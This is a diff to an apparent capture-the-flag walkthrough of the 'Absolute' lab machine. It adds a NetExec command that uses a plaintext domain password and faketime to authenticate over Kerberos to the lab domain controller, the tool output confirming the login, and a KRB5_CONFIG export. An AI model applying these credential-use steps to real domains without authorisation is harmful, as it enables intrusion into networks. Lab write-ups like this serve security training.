@@ -602,9 +602,22 @@ But since this user is part of the protected users, ill have to setup a realm
 
 # Access as `winrm_user` on winrm
 
-```python
+So before i can authenticate ill have to setup a realm
 
+```python
+sudo faketime -f +7h nxc smb dc.absolute.htb -u m.lovegod -p 'AbsoluteLDAP2022!' -k --generate-krb5-file /etc/krb5.conf
+[sudo] password for kali: 
+SMB         dc.absolute.htb 445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         dc.absolute.htb 445    DC               [+] krb5 conf saved to: /etc/krb5.conf
+SMB         dc.absolute.htb 445    DC               [+] Run the following command to use the conf file: export KRB5_CONFIG=/etc/krb5.conf
+SMB         dc.absolute.htb 445    DC               [+] absolute.htb\m.lovegod:AbsoluteLDAP2022!
 ```
+
+```python
+export KRB5_CONFIG=/etc/krb5.conf
+```
+
+Now this is exported 
 
 
 
